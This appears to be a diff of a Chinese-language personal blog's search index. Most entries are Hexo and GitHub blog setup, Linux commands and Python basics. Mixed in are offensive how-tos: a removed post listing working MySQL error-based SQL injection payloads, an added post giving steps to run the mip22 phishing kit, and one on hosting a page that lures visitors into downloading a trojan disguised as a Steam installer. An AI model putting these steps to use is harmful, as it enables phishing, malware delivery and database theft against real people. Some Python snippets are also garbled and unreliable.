@@ -1,449 +1,423 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Python文件操作</title>
-    <url>/2023/12/21/text18/</url>
-    <content><![CDATA[
-        <h3 id="Python-文件操作详解"   >
-          <a href="#Python-文件操作详解" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python-文件操作详解" class="headerlink" title="Python 文件操作详解"></a>Python 文件操作详解</h3>
-      <p>Python 提供了多种文件操作的工具，使得文件的读写和处理变得非常方便。以下是文件操作的一些关键概念和示例。</p>
-
-        <h4 id="1-打开文件"   >
-          <a href="#1-打开文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-打开文件" class="headerlink" title="1. 打开文件"></a>1. 打开文件</h4>
-      <p>使用 <code>open()</code> 函数打开文件。语法如下：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">file = open(&#x27;filename&#x27;, &#x27;mode&#x27;)</span><br></pre></td></tr></table></div></figure>
-
+    <title>用Github搭建个人博客</title>
+    <url>/2023/12/01/text2/</url>
+    <content><![CDATA[<ol>
+<li>提前安装好(node.js)<span class="exturl"><a class="exturl__link"   href="https://nodejs.org/en]" >[https://nodejs.org/en]</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 左边的那个</li>
+<li>提前安装好(GIt)<span class="exturl"><a class="exturl__link"   href="https://git-scm.com/downloads]" >[https://git-scm.com/downloads]</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+<li>提前注册好一个github账号</li>
+<li>在本地找个目录放博客源文件，路径不要有中文</li>
+<li>在选定的目录中，打开cmd</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701344628003-4a10e2c8-6b0c-4bf1-a346-ac20e52dc8ac.png" alt="image.png"><br>6.使用npm命令安装Hexo，输入</p>
+<p>npm install -g hexo-cli<br>hexo init blog<br>cd blog<br>hexo g</p>
+<p>构建好的效果:<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701344760454-e607748c-fe8a-489f-bbca-954b44fa7cf3.png" alt="image.png"><br>7.cd进入这个目录，分别按顺序输入以下三条命令就可以访问127.0.0.1:4000访问blog了</p>
+<p>hexo new test_my_site<br>hexo g<br> hexo s</p>
+<p>8.配置ssh</p>
+<p>cd ~&#x2F;.ssh #检查本机已存在的ssh密钥<br>ssh-keygen -t rsa -C “自己的邮箱地址”</p>
+<p> 然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：<br>9.key填写C:\Users\Administrator.ssh\id_rsa.pub中的内容<br>10.尝试ssh连接,测试是否成功,如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，就算成功。</p>
+<p>ssh -T <span class="exturl"><a class="exturl__link"   href="mailto:git@github.com" >git@github.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p>
+<p>11.在选中的位置(blog目录下)打开cmd</p>
+<p>npm install hexo-deployer-git –save<br>git config –global user.name “github用户名，非昵称 “<br>git config –global user.email “github注册邮箱“</p>
+<p>12.准备上传代码</p>
 <ul>
-<li><code>&#39;filename&#39;</code>：要打开的文件名或路径。</li>
-<li><code>&#39;mode&#39;</code>：打开文件的模式，如 <code>&#39;r&#39;</code> 表示读取模式，<code>&#39;w&#39;</code> 表示写入模式，<code>&#39;a&#39;</code> 表示追加模式，<code>&#39;b&#39;</code> 表示二进制模式等。</li>
+<li>在github上新建一个存储库，命名为github的用户名.github.io</li>
+<li>编辑_config.yml文件，在最后改成这样（注意保持格式，缩进不对，会导致一会儿，上传不成功）</li>
 </ul>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">deploy: </span><br><span class="line">   type: git </span><br><span class="line">   repository: git@github.com:luozhixiaowo/luozhixiaowo.github.io.gi </span><br><span class="line">   t </span><br><span class="line">   branch: main</span><br></pre></td></tr></table></div></figure>
 
-        <h4 id="2-读取文件"   >
-          <a href="#2-读取文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-读取文件" class="headerlink" title="2. 读取文件"></a>2. 读取文件</h4>
-      <p>使用不同的方法读取文件内容：</p>
-<p># 读取整个文件 </p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line"></span><br><span class="line">content = file.read()</span><br><span class="line"></span><br><span class="line">print(content)</span><br></pre></td></tr></table></div></figure>
-
-<p># 逐行读取文件</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line"></span><br><span class="line">lines = file.readlines()</span><br><span class="line"></span><br><span class="line">for line in lines: </span><br><span class="line"></span><br><span class="line">print(line)</span><br></pre></td></tr></table></div></figure>
-
-
-
-
-        <h4 id="3-写入文件"   >
-          <a href="#3-写入文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-写入文件" class="headerlink" title="3. 写入文件"></a>3. 写入文件</h4>
-      <p># 写入整个文件</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="line"></span><br><span class="line">file.write(&#x27;Hello, World!&#x27;)</span><br></pre></td></tr></table></div></figure>
-
-<p># 追加内容到文件</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;a&#x27;) as file:</span><br><span class="line"></span><br><span class="line">file.write(&#x27;\nAppending more content.&#x27;)</span><br></pre></td></tr></table></div></figure>
-
-
-
-
-        <h4 id="4-文件迭代器"   >
-          <a href="#4-文件迭代器" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-文件迭代器" class="headerlink" title="4. 文件迭代器"></a>4. 文件迭代器</h4>
-      <p>使用 <code>for</code> 循环逐行读取文件：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line"></span><br><span class="line">for line in file:</span><br><span class="line"></span><br><span class="line">print(line)</span><br></pre></td></tr></table></div></figure>
-
-
-
-
-        <h4 id="5-关闭文件"   >
-          <a href="#5-关闭文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-关闭文件" class="headerlink" title="5. 关闭文件"></a>5. 关闭文件</h4>
-      <p>在使用 <code>open()</code> 打开文件后，使用 <code>close()</code> 方法关闭文件：</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="code"><pre><span class="line">codefile = <span class="built_in">open</span>(<span class="string">&#x27;example.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">content = file.read()</span><br><span class="line">file.close()</span><br></pre></td></tr></table></div></figure>
-
-
-        <h4 id="6-使用-with-语句"   >
-          <a href="#6-使用-with-语句" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-使用-with-语句" class="headerlink" title="6. 使用 with 语句"></a>6. 使用 <code>with</code> 语句</h4>
-      <p>使用 <code>with</code> 语句可以自动管理文件的打开和关闭，确保文件正确关闭：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">pythonCopy codewith open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">    content = file.read()</span><br><span class="line">    # 在此处文件自动关闭</span><br></pre></td></tr></table></div></figure>
-
-
-        <h4 id="7-二进制文件操作"   >
-          <a href="#7-二进制文件操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-二进制文件操作" class="headerlink" title="7. 二进制文件操作"></a>7. 二进制文件操作</h4>
-      <p>读写二进制文件的示例：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">pythonCopy codewith open(&#x27;binary_file.bin&#x27;, &#x27;wb&#x27;) as file:</span><br><span class="line">    file.write(b&#x27;Binary data&#x27;)</span><br><span class="line"></span><br><span class="line">with open(&#x27;binary_file.bin&#x27;, &#x27;rb&#x27;) as file:</span><br><span class="line">    data = file.read()</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></div></figure>
-
-
-        <h4 id="8-文件异常处理"   >
-          <a href="#8-文件异常处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-文件异常处理" class="headerlink" title="8. 文件异常处理"></a>8. 文件异常处理</h4>
-      <p>在文件操作中添加异常处理，防止程序崩溃：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">pythonCopy codetry:</span><br><span class="line">    with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">        content = file.read()</span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    print(&#x27;File not found!&#x27;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(f&#x27;An error occurred: &#123;e</span><br></pre></td></tr></table></div></figure>
+<p>13.上传</p>
+<p>hexo d</p>
+]]></content>
+      <tags>
+        <tag>个人博客</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>钓鱼网站链接获取</title>
+    <url>/2023/12/01/text1/</url>
+    <content><![CDATA[<p>1.vim &#x2F;etc&#x2F;proxychains4.conf (修改socks 4-5 更改IP和端口号)<br>2.proxychains4 git clone <span class="exturl"><a class="exturl__link"   href="https://github.com/makdosx/mip22" >https://github.com/makdosx/mip22</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> (下载需要的文件)<br>3.cd mip22<br>4.chmod +x  .&#x2F;* (增加执行权限)<br>5.proxychains4 bash .&#x2F;mip22.sh (执行脚本文件)<br>出现底下情况执行  proxychains4  -q bash .&#x2F;mip22.sh<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701172697552-5a930f93-1f4d-42d9-9a65-ea7dfc19fe72.png" alt="image.png"><br>6.输入1<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701172800528-0d644e07-094e-4222-84ca-27f41ca044b3.png" alt="image.png"><br>7.输入数字选择需要的网站<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701172935240-816c59e7-9091-4b9b-b985-f25dabc75c51.png" alt="image.png"></p>
+<p>8.根据数字选择链接在内网还是外网生效<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701172996565-8385b5a6-a5e8-479e-868a-9b14a01be7cf.png" alt="image.png"></p>
 ]]></content>
   </entry>
   <entry>
-    <title>SQL注入2</title>
-    <url>/2023/12/21/text17/</url>
+    <title>用Github部署图床</title>
+    <url>/2023/12/02/text3/</url>
+    <content><![CDATA[<p>1.下载安装Typora 链接:<span class="exturl"><a class="exturl__link"   href="https://typoraio.cn/" >https://typoraio.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>2.下载安装PicGo 链接:<span class="exturl"><a class="exturl__link"   href="https://picgo.github.io/PicGo-Doc/zh/" >https://picgo.github.io/PicGo-Doc/zh/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>3.在GitHub上建立一个存放图片的仓库<br>4.打开GitHub个人账号的设置<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701346883504-a688855f-91a6-4619-b16c-dc801659c7ea.png" alt="image.png"><br>5.打开开发者选项<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701346931466-63a14f2d-eb0a-43f6-9427-4a8f81681492.png" alt="image.png"><br>6.生成token<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701346995044-af188b21-351e-4998-b9ad-1e1aaf9339af.png" alt="image.png"><br>7.打开Pic Go图床设置Github编辑<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701347133776-2525ec9b-d1fa-4199-908c-d19b773f428c.png" alt="image.png"><br>8.打开pytora验证，文件-偏好设置-图像<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701347239890-3c00118f-2e10-4ce7-95cd-9378120de75f.png" alt="image.png"></p>
+]]></content>
+      <tags>
+        <tag>个人博客</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>引导下载木马</title>
+    <url>/2023/12/01/text/</url>
+    <content><![CDATA[<p>1.安装phpstudy并启动apache服务<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701255876063-304fac1e-b8d2-4a4b-bdf0-a065e0e3c413.png" alt="image.png"><br>2.打开网站根目录<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701255958294-f8f5bdce-de2b-4ffe-ac08-8a4cfc2a19d4.png" alt="image.png"><br>3.根据index.html的内容实现不同的引导下载方式</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script src=&quot;./flash.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;h1&gt;hello world&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701257269692-4e244c1d-df9d-4454-86c6-5ca123c37926.png" alt="image.png"><br>4.更换href里面的链接可以替换下载内容</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203111412598.png" alt="image-20231203111412598"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&lt;a class=&quot;header_installsteam_btn_content&quot; href=&quot;http://192.168.101.130/SteamSetup.exe&quot;&gt;</span><br></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>Linux文件与目录，创建新用户</title>
+    <url>/2023/12/03/text4/</url>
     <content><![CDATA[
-        <h1 id="1-postman使用"   >
-          <a href="#1-postman使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-postman使用" class="headerlink" title="1.postman使用"></a>1.postman使用</h1>
-      <p>1.进入火狐浏览器按shift+f12左下角网络在相应的页面发生请求可以获得网络活动信息可以找到对应的api请求</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221193551394.png" alt="image-20231221193551394"></p>
-<p>2.点击new选择http将获取到的api链接放到上方地址栏根据实际情况选择GET还是其它请求点击send就能发送api请求</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221192829536.png" alt="image-20231221192829536"></p>
-<p>3.在下方id一栏可以输入注入的sql语句后点击send就能执行注入获得数据库信息</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221193745503.png" alt="image-20231221193745503"></p>
+        <h1 id="1-Linux-系统目录结构"   >
+          <a href="#1-Linux-系统目录结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Linux-系统目录结构" class="headerlink" title="1.Linux 系统目录结构"></a>1.Linux 系统目录结构</h1>
+      <p>登录系统后，在当前命令窗口下输入命令：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">ls / </span><br></pre></td></tr></table></div></figure>
 
-        <h1 id="2-SQL注入之MySQL报错"   >
-          <a href="#2-SQL注入之MySQL报错" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SQL注入之MySQL报错" class="headerlink" title="2.SQL注入之MySQL报错"></a>2.SQL注入之MySQL报错</h1>
-      <p>1.报错注入十大方法，依次是：</p>
-<p>（1）floor() 　　如：select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</p>
-<p>（2）extractvalue()　　如：select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>
-<p>（3）updatexml()　　如：select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p>
-<p>（4）geometrycollection()　　如：select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</p>
-<p>（5）multipoint()　　如：select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</p>
-<p>（6）polygon()　　如：select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</p>
-<p>（7）multipolygon()　　如：select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</p>
-<p>（8）linestring()　　如：select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</p>
-<p>（9）multilinestring()　　如：select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</p>
-<p>（10）exp()　　如：select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</p>
-<p>2.使用方法就是把select user部分语句换成自己想用来获取什么数据信息的语句</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221201250317.png" alt="image-20231221201250317"></p>
+<p>你会看到如下图所示:</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/4_20.png" alt="img"></p>
+<p>树状目录结构：</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/d0c50-linux2bfile2bsystem2bhierarchy.jpg" alt="img"></p>
+<p>以下是对这些目录的解释：</p>
+<ul>
+<li><p><strong>&#x2F;bin</strong>：<br>bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。</p>
+</li>
+<li><p><strong>&#x2F;boot：</strong><br>这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。</p>
+</li>
+<li><p><strong>&#x2F;dev ：</strong><br>dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。</p>
+</li>
+<li><p><strong>&#x2F;etc：</strong><br>etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。</p>
+</li>
+<li><p><strong>&#x2F;home</strong>：<br>用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，如上图中的 alice、bob 和 eve。</p>
+</li>
+<li><p><strong>&#x2F;lib</strong>：<br>lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。</p>
+</li>
+<li><p><strong>&#x2F;lost+found</strong>：<br>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。</p>
+</li>
+<li><p><strong>&#x2F;media</strong>：<br>linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。</p>
+</li>
+<li><p><strong>&#x2F;mnt</strong>：<br>系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 &#x2F;mnt&#x2F; 上，然后进入该目录就可以查看光驱里的内容了。</p>
+</li>
+<li><p><strong>&#x2F;opt</strong>：<br>opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</p>
+</li>
+<li><p><strong>&#x2F;proc</strong>：<br>proc 是 Processes(进程) 的缩写，&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<br>这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping</p>
+</li>
+</ul>
 
-        <h1 id="3-sql注入介绍"   >
-          <a href="#3-sql注入介绍" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-sql注入介绍" class="headerlink" title="3.sql注入介绍"></a>3.sql注入介绍</h1>
-      <p>1.SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。</p>
-<p>2.SQL注入漏洞的成因：用户提交的参数数据未做充分检查过滤<br><span class="exturl"><a class="exturl__link"   href="http://www.any.com/index.jsp?username=admin&pass=pass" >http://www.any.com/index.jsp?username=admin&amp;pass=pass</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>3.SQL注入的危害：<br>（1）数据泄露：数据库中存放的用户的隐私信息的泄露。</p>
-<p>（2）网页篡改：通过操作数据库对特定网页进行篡改。</p>
-<p>（3）网站挂马：修改数据库一些字段的值嵌入网马链接，进行挂马攻击</p>
-<p>（4）服务器被远程控制：被安装后门。经由数据库服务器提供的操作系统支持让黑客得以修改或控制      操作系统。<br>（5）数据破坏：数据库服务器被攻击，数据库的系统管理员帐户被窜改系统瘫痪。</p>
-<p>4.SQL注入分类：</p>
-<p>（1）<strong>基于错误的注入（Error-Based SQL Injection）：</strong> 攻击者通过触发应用程序中的错误，从错误消息中获取敏感信息，或者利用错误来执行进一步的攻击。</p>
-<p>（2）<strong>联合查询注入（Union-Based SQL Injection）：</strong> 攻击者利用<code>UNION</code>语句将额外的数据行合并到查询结果中，通常用于提取其他表的信息。</p>
-<p>（3）<strong>时间盲注入（Time-Based Blind SQL Injection）：</strong> 攻击者通过向数据库引入延时函数，从而判断条件是否为真。这种注入方式常用于盲注入攻击，无法直接获取数据，但可以通过延时来确认注入点。</p>
-<p>（4）<strong>基于布尔的盲注入（Boolean-Based Blind SQL Injection）：</strong> 攻击者通过向数据库引入布尔条件，判断查询是否返回真或假，从而逐位地获取数据。</p>
-<p>（5）<strong>堆叠查询注入（Stacked Queries SQL Injection）：</strong> 攻击者在单个SQL查询中执行多个查询，从而实现复杂的数据库操作。</p>
-<p>（6）<strong>报错盲注入（Error-Based Blind SQL Injection）：</strong> 类似于基于错误的注入，但攻击者无法直接看到错误消息，而是通过观察应用程序的行为来判断注入是否成功。</p>
-<p>（7）<strong>UNION查询注入：</strong> 攻击者通过构造<code>UNION</code>语句将额外的数据行合并到查询结果中，从而获取其他表的信息。</p>
-<p>（8）<strong>注释符(#)绕过：</strong> 攻击者通过在注入点使用<code>#</code>符号来注释掉原有的SQL语句，从而绕过输入验证。</p>
-<p>（9）<strong>报错注入：</strong> 攻击者通过构造恶意的输入，使得数据库产生错误，从而获取敏感信息。</p>
-<p>（10）<strong>时间盲注入：</strong> 攻击者通过引入时间延迟，判断SQL查询条件是否为真，从而逐步获取数据。</p>
-<p>（11）<strong>Second-Order注入：</strong> 攻击者利用应用程序中存储的用户输入，使得后续的操作受到影响。</p>
-<p>5.SQL Injection函数</p>
-<p>user（)：当前用户名<br>database(）：当前所用数据库<br>current_user()：当前用户名（可用来查看权限)<br>version()：数据库的版本<br>@@datadir：数据库的路径<br>@@version_compile_os：操作系统版本<br>into dumpfile：写文件操作</p>
-<p>into outfile :写文件</p>
-<p>load_file()∶读文件操作</p>
-<p>concat(str1,str2..)∶连接字符串，连接两个或多个数组</p>
-<p>group_concat(str1,str2..)∶连接字符串，能将相同的行组合起来</p>
-<p>length ( ) &#x3D;&gt;计算字符串长度</p>
-<p>hex ( ) &#x3D;&gt;字符转换为16进制</p>
-<p>6.SQL注释</p>
+        <h1 id="2-Linux-文件与目录管理和创建新用户"   >
+          <a href="#2-Linux-文件与目录管理和创建新用户" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Linux-文件与目录管理和创建新用户" class="headerlink" title="2.Linux 文件与目录管理和创建新用户"></a>2.Linux 文件与目录管理和创建新用户</h1>
+      <p>ls: 列出目录及文件名</p>
+<ul>
+<li>a ：全部的文件，连同隐藏文件( 开头为 . 的文件) 一起列出来(常用)</li>
+<li>-d ：仅列出目录本身，而不是列出目录内的文件数据(常用)</li>
+<li>-l ：长数据串列出，包含文件的属性与权限等等数据；(常用)</li>
+</ul>
+<p>cd：切换目录</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203151412102.png" alt="image-20231203151412102">cd 绝对路径</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203151531184.png" alt="image-20231203151531184">cd 相对路径</p>
+<p>pwd：显示目前的目录</p>
+<ul>
+<li><strong>-P</strong> ：显示出确实的路径，而非使用链接 (link) 路径。</li>
+</ul>
+<p>mkdir：创建一个新的目录</p>
+<p>   <img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203152027323.png" alt="image-20231203152027323"></p>
+<ul>
+<li>-m ：配置文件的权限喔！直接配置，不需要看默认权限 (umask) 的脸色～</li>
+<li>-p ：帮助你直接将所需要的目录(包含上一级目录)递归创建起来！</li>
+</ul>
+<p>rmdir：删除一个空的目录</p>
+<p>​    <img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203152125159.png" alt="image-20231203152125159"></p>
+<ul>
+<li><strong>-p ：</strong>从该目录起，一次删除多级空目录</li>
+</ul>
+<p>touch: 创建一个新的文件</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203153414399.png"></p>
+<p>vi&#x2F;vim的使用</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203153604813.png" alt="image-20231203153604813"></p>
+<p>按下 <strong>i</strong> 就进入了输入模式，使用 <strong>Esc</strong> 键可以返回到普通模式。</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203153747054.png" alt="image-20231203153747054"></p>
+<p>在普通模式下按下 **:**（英文冒号）就进入了底行命令模式。</p>
+<p><img src="C:/Users/15386/AppData/Roaming/Typora/typora-user-images/image-20231203153921825.png" alt="image-20231203153921825"></p>
+<p>在底线命令模式中，基本的命令有</p>
+<ul>
+<li><code>:w</code>：保存文件。</li>
+<li><code>:q</code>：退出 Vim 编辑器。</li>
+<li><code>:wq</code>：保存文件并退出 Vim 编辑器。</li>
+<li><code>:q!</code>：强制退出Vim编辑器，不保存修改。</li>
+</ul>
+<p>useradd：创建新用户</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203154159832.png" alt="image-20231203154159832"></p>
+<p>passwd：给用户设定更新密码</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203154252280.png" alt="image-20231203154252280"></p>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python安装与基础语法</title>
+    <url>/2023/12/03/text5/</url>
+    <content><![CDATA[
+        <h1 id="1-python安装"   >
+          <a href="#1-python安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-python安装" class="headerlink" title="1.python安装"></a>1.python安装</h1>
+      <p>来到<span class="exturl"><a class="exturl__link"   href="https://so.csdn.net/so/search?q=Python%E5%AE%98%E7%BD%91&spm=1001.2101.3001.7020" >Python官网</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>：<span class="exturl"><a class="exturl__link"   href="https://www.python.org/" >https://www.python.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>Downloads&gt;Windows：<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203161517785.png" alt="image-20231203161517785"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203161653328.png" alt="image-20231203161653328"></p>
+<p>点击链接下载python最新版本</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203161844634.png" alt="image-20231203161844634"></p>
+<p>下载后点击安装：</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/4fe7fb7a95f941d5d7c06079c563899e.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/f09156cac5de4301fc14f84da0654f2e.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/57ff1575cde4ddfeb9c1697b3c7eb390.png" alt="img"></p>
+<p>在本地电脑输入命令提示符：win+R</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1ab2553654d102f6a8371f8fea5b7ed9.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/fc81e83df580b7c6d7be15195f054407.png" alt="img"></p>
+
+        <h1 id="2-python基础语法"   >
+          <a href="#2-python基础语法" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-python基础语法" class="headerlink" title="2.python基础语法"></a>2.python基础语法</h1>
+      
+        <h2 id="标识符"   >
+          <a href="#标识符" class="heading-link"><i class="fas fa-link"></i></a><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2>
+      <ul>
+<li>第一个字符必须是字母表中字母或下划线 <strong>_</strong> 。</li>
+<li>标识符的其他的部分由字母、数字和下划线组成。</li>
+<li>标识符对大小写敏感。</li>
+</ul>
+<p>在 Python 3 中，可以用中文作为变量名，非 ASCII 标识符也是允许的了。</p>
+<hr>
+
+        <h2 id="python关键字"   >
+          <a href="#python关键字" class="heading-link"><i class="fas fa-link"></i></a><a href="#python关键字" class="headerlink" title="python关键字"></a>python关键字</h2>
+      <p>关键字，我们不能把它们用作任何标识符名称。Python 的标准库提供了一个 keyword 模块，可以输出当前版本的所有关键字：</p>
